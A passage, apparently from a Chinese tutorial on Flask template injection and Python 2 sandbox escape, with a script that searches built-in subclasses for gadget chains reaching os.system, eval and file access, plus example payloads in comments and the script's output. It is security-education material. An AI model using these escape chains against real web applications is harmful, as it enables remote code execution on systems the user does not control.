class="hljs-string">&#x27;plat-mac&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;_threading_local&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;_LWPCookieJar&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;wsgiref.egg-info&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;sha&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;sre_constants&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;json&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;Cookie&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;tokenize&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;plat-beos5&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;rexec&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;lib-tk&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;textwrap&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;fractions&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;sqlite3&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;posixfile&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>],                <span class="hljs-string">&#x27;imaplib&#x27;</span>: [<span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;xdrlib&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;imghdr&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;macurl2path&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;_osx_support&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;webbrowser&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>],                <span class="hljs-string">&#x27;plat-netbsd1&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;nturl2path&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;tkinter&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;copy&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;pickletools&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;hashlib&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;anydbm&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>], <span class="hljs-string">&#x27;keyword&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;timeit&#x27;</span>: [<span class="hljs-string">&#x27;timeit&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;uu&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;StringIO&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;modulefinder&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;stringprep&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;markupbase&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;colorsys&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;shelve&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>], <span class="hljs-string">&#x27;multifile&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;sre_parse&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;pickle&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;plat-os2emx&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;mimetools&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;audiodev&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;copy_reg&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;sre_compile&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>], <span class="hljs-string">&#x27;CGIHTTPServer&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;idlelib&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;site&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;getpass&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;imputil&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;bsddb&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;contextlib&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;numbers&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;io&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>],                <span class="hljs-string">&#x27;plat-sunos5&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;symtable&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;pyclbr&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;shutil&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;lib2to3&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;threading&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;dbhash&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>],                <span class="hljs-string">&#x27;gettext&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;dumbdbm&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>],                <span class="hljs-string">&#x27;_weakrefset&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;_abcoll&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;MimeWriter&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;test&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;opcode&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;csv&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;nntplib&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;profile&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;genericpath&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;stat&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;__phello__.foo&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;sched&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;statvfs&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;trace&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;warnings&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;symbol&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;sets&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;htmlentitydefs&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;urllib2&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;SimpleXMLRPCServer&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;sunaudio&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;pdb.doc&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;asynchat&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;user&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;xmllib&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;codeop&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;plat-next3&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;types&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;argparse&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;uuid&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;plat-aix4&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;plat-aix3&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;ssl&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;poplib&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;xmlrpclib&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;difflib&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;urlparse&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;linecache&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;_strptime&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;htmllib&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;site-packages&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;posixpath&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;stringold&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;gzip&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>], <span class="hljs-string">&#x27;mhlib&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;rlcompleter&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;hmac&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>]&#125;target_modules = [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;platform&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;timeit&#x27;</span>, <span class="hljs-string">&#x27;importlib&#x27;</span>, <span class="hljs-string">&#x27;codecs&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>]target_functions = [<span class="hljs-string">&#x27;__import__&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;execfile&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>]all_targets = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">set</span>(find_modules.keys() + target_modules + target_functions))all_modules = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">set</span>(find_modules.keys() + target_modules))subclasses = ().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()sub_name = [s.__name__ <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> subclasses]<span class="hljs-comment"># 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40](&#x27;./test.py&#x27;).read()</span>print(<span class="hljs-string">&#x27;----------1-----------&#x27;</span>)<span class="hljs-keyword">for</span> i, s <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(sub_name):    <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> all_targets:        <span class="hljs-keyword">if</span> f == s:            <span class="hljs-keyword">if</span> f <span class="hljs-keyword">in</span> target_functions:                print(i, f)            <span class="hljs-keyword">elif</span> f <span class="hljs-keyword">in</span> all_modules:                target = find_modules[f]                sub_dict = subclasses[i].__dict__                <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> target:                    <span class="hljs-keyword">if</span> t <span class="hljs-keyword">in</span> sub_dict:                        print(i, f, target)print(<span class="hljs-string">&#x27;----------2-----------&#x27;</span>)<span class="hljs-comment"># 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#x27;linecache&#x27;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;sy&#x27;+&#x27;stem&#x27;](&#x27;ls&#x27;)</span><span class="hljs-keyword">for</span> i, sub <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(subclasses):    <span class="hljs-keyword">try</span>:        more = sub.__init__.func_globals        <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> all_targets:            <span class="hljs-keyword">if</span> m <span class="hljs-keyword">in</span> more:                print(i, sub, m, find_modules.get(m))    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:        <span class="hljs-keyword">pass</span>print(<span class="hljs-string">&#x27;----------3-----------&#x27;</span>)<span class="hljs-comment"># 第三种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;)</span><span class="hljs-keyword">for</span> i, sub <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(subclasses):    <span class="hljs-keyword">try</span>:        more = sub.__init__.func_globals.values()        <span class="hljs-keyword">for</span> j, v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(more):            <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> all_targets:                <span class="hljs-keyword">try</span>:                    <span class="hljs-keyword">if</span> f <span class="hljs-keyword">in</span> v:                        <span class="hljs-keyword">if</span> f <span class="hljs-keyword">in</span> target_functions:                            print(i, j, sub, f)                        <span class="hljs-keyword">elif</span> f <span class="hljs-keyword">in</span> all_modules:                            target = find_modules.get(f)                            sub_dict = v[f].__dict__                            <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> target:                                <span class="hljs-keyword">if</span> t <span class="hljs-keyword">in</span> sub_dict:                                    print(i, j, sub, f, target)                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:                    <span class="hljs-keyword">pass</span>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:        <span class="hljs-keyword">pass</span>print(<span class="hljs-string">&#x27;----------4-----------&#x27;</span>)<span class="hljs-comment"># 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__[&#x27;__import__&#x27;](&quot;os&quot;).system(&quot;ls&quot;)</span><span class="hljs-comment"># &lt;class &#x27;warnings.catch_warnings&#x27;&gt;类很特殊，在内部定义了_module=sys.modules[&#x27;warnings&#x27;]，然后warnings模块包含有__builtins__，不具有通用性，本质上跟第一种方法类似</span><span class="hljs-keyword">for</span> i, sub <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(subclasses):    <span class="hljs-keyword">try</span>:        more = sub()._module.__builtins__        <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> all_targets:            <span class="hljs-keyword">if</span> f <span class="hljs-keyword">in</span> more:                print(i, f)    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:        <span class="hljs-keyword">pass</span></code></pre></div>#### **运行结果**<div class="hljs code-wrapper"><pre><code class="hljs bash">G:\Program\Python\tools\flask ssti&gt;python27 python2_find_chain.py----------1-----------(40, <span class="hljs-string">&#x27;file&#x27;</span>)----------2-----------(59, &lt;class <span class="hljs-string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, <span class="hljs-string">&#x27;linecache&#x27;</span>, [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>])(59, &lt;class <span class="hljs-string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, None)(59, &lt;class <span class="hljs-string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, <span class="hljs-string">&#x27;sys&#x27;</span>, None)(59, &lt;class <span class="hljs-string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, <span class="hljs-string">&#x27;types&#x27;</span>, [<span class="hljs-string">&#x27;__builtins__&#x27;</span>])(60, &lt;class <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, <span class="hljs-string">&#x27;linecache&#x27;</span>, [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>])(60, &lt;class <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, None)(60, &lt;class <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, <span class="hljs-string">&#x27;sys&#x27;</span>, None)(60, &lt;class <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, <span class="hljs-string">&#x27;types&#x27;</span>, [<span class="hljs-string">&#x27;__builtins__&#x27;</span>])(61, &lt;class <span class="hljs-string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, None)(62, &lt;class <span class="hljs-string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, None)(72, &lt;class <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, None)(72, &lt;class <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;, <span class="hljs-string">&#x27;traceback&#x27;</span>, [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>])(72, &lt;class <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;, <span class="hljs-string">&#x27;os&#x27;</span>, [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>])(72, &lt;class <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;, <span class="hljs-string">&#x27;sys&#x27;</span>, None)(77, &lt;class <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, None)(77, &lt;class <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;, <span class="hljs-string">&#x27;traceback&#x27;</span>, [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>])(77, &lt;class <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;, <span class="hljs-string">&#x27;os&#x27;</span>, [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>])(77, &lt;class <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;, <span class="hljs-string">&#x27;sys&#x27;</span>, None)(78, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, None)(78, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;sys&#x27;</span>, None)(78, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;open&#x27;</span>, None)(79, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, None)(79, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;sys&#x27;</span>, None)(79, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;open&#x27;</span>, None)----------3-----------(59, 13, &lt;class <span class="hljs-string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, <span class="hljs-string">&#x27;__import__&#x27;</span>)(59, 13, &lt;class <span class="hljs-string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, <span class="hljs-string">&#x27;file&#x27;</span>)(59, 13, &lt;class <span class="hljs-string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, <span class="hljs-string">&#x27;compile&#x27;</span>)(59, 13, &lt;class <span class="hljs-string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, <span class="hljs-string">&#x27;eval&#x27;</span>)(59, 13, &lt;class <span class="hljs-string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, <span class="hljs-string">&#x27;open&#x27;</span>)(59, 13, &lt;class <span class="hljs-string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, <span class="hljs-string">&#x27;execfile&#x27;</span>)(60, 13, &lt;class <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, <span class="hljs-string">&#x27;__import__&#x27;</span>)(60, 13, &lt;class <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, <span class="hljs-string">&#x27;file&#x27;</span>)(60, 13, &lt;class <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, <span class="hljs-string">&#x27;compile&#x27;</span>)(60, 13, &lt;class <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, <span class="hljs-string">&#x27;eval&#x27;</span>)(60, 13, &lt;class <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, <span class="hljs-string">&#x27;open&#x27;</span>)(60, 13, &lt;class <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, <span class="hljs-string">&#x27;execfile&#x27;</span>)(61, 1, &lt;class <span class="hljs-string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;, <span class="hljs-string">&#x27;__import__&#x27;</span>)(61, 1, &lt;class <span class="hljs-string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;, <span class="hljs-string">&#x27;file&#x27;</span>)(61, 1, &lt;class <span class="hljs-string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;, <span class="hljs-string">&#x27;compile&#x27;</span>)(61, 1, &lt;class <span 